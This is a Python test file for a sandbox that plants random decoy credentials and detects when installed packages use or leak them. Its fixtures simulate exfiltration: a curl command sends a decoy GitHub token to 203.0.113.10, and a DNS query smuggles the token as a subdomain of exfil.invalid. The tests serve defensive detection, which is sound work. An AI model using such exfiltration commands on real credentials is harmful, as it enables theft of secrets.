from pathlib import Path

from brain.decoys import decoy_hits, redact
from brain.llm import LlmOutcome
from brain.pipeline import analyze
from brain.rules import Severity
from chamber.decoys import decoy_env, make_decoys, write_bait_files
from shared.contract import DetonateResult, DnsQuery, ExecEvent
from tests.test_intent import meta

DECOYS = make_decoys()
TOKEN = DECOYS["GITHUB_TOKEN"]


def ex(binary: str, args: str, pid: int = 7) -> ExecEvent:
    return ExecEvent(ts="t", pid=pid, ppid=1, binary=binary, args=args, parent_binary="sh",
                     uid=10001, cwd="/work")  # fmt: skip


def res(execs=(), dns=(), stdout="") -> DetonateResult:
    return DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                          exec_events=list(execs), connect_events=[], dns_queries=list(dns),
                          stdout_tail=stdout, stderr_tail="", decoys=DECOYS)  # fmt: skip


def test_decoys_are_random_per_run_and_token_shaped():
    other = make_decoys()
    assert DECOYS["GITHUB_TOKEN"] != other["GITHUB_TOKEN"]
    assert DECOYS["GITHUB_TOKEN"].startswith("ghp_") and len(DECOYS["GITHUB_TOKEN"]) == 40
    assert DECOYS["AWS_ACCESS_KEY_ID"].startswith("AKIA") and len(DECOYS["AWS_ACCESS_KEY_ID"]) == 20
    env = decoy_env(DECOYS)
    assert env["CI"] == "true" and env["PATH"].startswith("/usr/local/decoy/bin:")
    assert "NPMRC_TOKEN" not in env  # that one only lives in ~/.npmrc


def test_bait_files_carry_this_runs_values(tmp_path):
    files = write_bait_files(tmp_path, DECOYS)
    assert DECOYS["NPMRC_TOKEN"] in files["npmrc"].read_text()
    assert "npm.pkg.github.com" in files["npmrc"].read_text()  # never sent to the npm registry
    assert DECOYS["AWS_SECRET_ACCESS_KEY"] in files["aws_credentials"].read_text()


def test_token_in_curl_header_is_critical():
    curl = ex("/usr/bin/curl", f'-s -H "Authorization: token {TOKEN}" http://203.0.113.10/x')
    hits = decoy_hits(res([curl]))
    assert [(h.rule_id, h.severity, h.target) for h in hits] == [
        ("DECOY_CREDENTIAL_SEEN", Severity.CRITICAL, "GITHUB_TOKEN")
    ]
    assert TOKEN not in hits[0].evidence


def test_token_smuggled_in_dns_or_printed_is_seen():
    dns = DnsQuery(ts="t", domain=f"{TOKEN.lower()}.exfil.invalid", answers=[])
    assert {h.target for h in decoy_hits(res(dns=[dns]))} == {"GITHUB_TOKEN"}
    assert decoy_hits(res(stdout=f"leaked {DECOYS['NPM_TOKEN']}"))


def test_decoy_cli_invocation_is_high():
    hits = decoy_hits(res([ex("/usr/local/decoy/bin/gh", "auth token")]))
    assert [(h.rule_id, h.severity, h.target) for h in hits] == [
        ("DECOY_TOOL_INVOKED", Severity.HIGH, "gh")
    ]


def test_normal_install_has_no_decoy_hits():
    assert decoy_hits(res([ex("/usr/local/bin/node", "/usr/local/bin/npm install")])) == []


def test_nothing_shown_or_posted_contains_a_decoy_value():
    curl = ex("/usr/bin/curl", f'-H "Authorization: token {TOKEN}" http://203.0.113.10/x')
    sent = {}

    def llm(metadata, hits, result, diff, contract=None, guilty=None):
        sent["telemetry"] = result.model_dump_json()
        sent["findings"] = " ".join(h.evidence for h in hits)
        return LlmOutcome("m", error="x")

    out = analyze(res([curl]), meta(), "", llm, job_id="j", enrich=lambda r: r)
    assert out.final.title == "Blocked"
    for text in (sent["telemetry"], sent["findings"], out.report, out.result.model_dump_json()):
        assert all(v not in text for v in DECOYS.values())
    assert "<decoy:GITHUB_TOKEN>" in sent["telemetry"]


def test_redact_is_a_noop_without_decoys():
    plain = res().model_copy(update={"decoys": {}})
    assert redact(plain) is plain


def test_no_real_credentials_in_the_repo_bait():
    bait = Path(__file__).parent.parent / "chamber/sandbox/bait"
    for f in bait.iterdir():
        assert "ghp_" not in f.read_text() and "AKIA" not in f.read_text()
